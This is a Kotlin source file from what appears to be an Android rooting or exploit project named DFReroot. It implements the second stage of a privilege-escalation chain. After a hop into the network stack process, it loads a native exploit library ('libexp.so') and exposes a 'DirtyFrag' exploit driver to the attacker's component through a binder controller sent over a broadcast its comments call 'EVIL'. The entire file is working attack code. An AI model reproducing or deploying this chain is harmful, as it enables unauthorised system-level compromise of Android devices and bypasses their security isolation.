package com.polygraphene.df.reroot

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Binder
import android.os.IBinder
import android.os.Parcel
import android.os.RemoteException
import android.util.Log
import java.util.concurrent.atomic.AtomicBoolean
import org.lsposed.lspromise.DirtyFrag

/**
 * Stage 2: runs INSIDE com.android.networkstack.process after [StageHop]
 * bounces us there via scheduleReceiver (same trick as LSPromise
 * Shellcode.onReceive/stage2).
 *
 * Loads libexp.so from OUR apk (network_stack may dlopen apk natives, unlike
 * system_server) and exposes the DirtyFrag driver as a CONTROLLER binder back
 * to our system_server UI over the EVIL broadcast. LoadLibrary failure (e.g.
 * x86_64 emulator, whose lib is arm64-only) is logged, not fatal: the Java
 * hop itself is still verifiable end to end.
 */
class StageReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        Log.i(TAG, "in network_stack, stage 2")
        try {
            stage2(context)
        } catch (t: Throwable) {
            Log.e(TAG, "stage2 failed", t)
        }
        Log.i(TAG, StageHop.cleanupLoadedApk(context))
    }

    private fun stage2(context: Context) {
        try {
            System.loadLibrary("exp")
        } catch (e: UnsatisfiedLinkError) {
            Log.e(TAG, "loadLibrary(exp) failed (arm64-only lib?): $e")
            return
        }
        val controller = object : Binder() {
            override fun onTransact(
                code: Int, data: Parcel, reply: Parcel?, flags: Int
            ): Boolean {
                try {
                    when (code) {
                        5 -> {
                            Log.d(TAG, "run all")
                            val df = DirtyFrag(data.readStrongBinder())
                            reply?.writeInt(df.runAll())
                            return true
                        }
                    }
                } catch (e: RemoteException) {
                    throw e
                } catch (t: Throwable) {
                    Log.e(TAG, "controller transact failed", t)
                }
                return super.onTransact(code, data, reply, flags)
            }
        }

        heldController = controller
        sendController(context.applicationContext, controller)
        Log.i(TAG, "controller send started")
    }

    private fun sendController(context: Context, controller: Binder) {
        Thread {
            repeat(5) { attempt ->
                val delivered = AtomicBoolean(false)
                val conn = object : ServiceConnection {
                    override fun onServiceConnected(name: ComponentName, service: IBinder) {
                        val data = Parcel.obtain()
                        val reply = Parcel.obtain()
                        try {
                            data.writeStrongBinder(controller)
                            if (service.transact(1, data, reply, 0)) delivered.set(true)
                        } catch (t: Throwable) {
                            Log.e(TAG, "controller push failed ($attempt)", t)
                        } finally {
                            data.recycle()
                            reply.recycle()
                            try {
                                context.unbindService(this)
                            } catch (_: Exception) {
                            }
                        }
                    }

                    override fun onServiceDisconnected(name: ComponentName) {
                    }
                }
                try {
                    val i = Intent().apply {
                        setClassName(StageHop.PKG, "com.polygraphene.df.reroot.ControllerService")
                    }
                    if (context.bindService(i, conn, Context.BIND_AUTO_CREATE)) {
                        repeat(10) {
                            if (delivered.get()) return@Thread
                            Thread.sleep(500)
                        }
                    }
                    try {
                        context.unbindService(conn)
                    } catch (_: Exception) {
                    }
                } catch (t: Throwable) {
                    Log.e(TAG, "controller bind failed ($attempt)", t)
                }
                if (delivered.get()) {
                    Log.i(TAG, "controller pushed ($attempt)")
                    return@Thread
                }
                Thread.sleep(2000)
            }
            Log.w(TAG, "controller push retries exhausted")
        }.start()
    }

    companion object {
        const val TAG = "DFReroot"
        @Volatile private var heldController: Binder? = null
    }
}
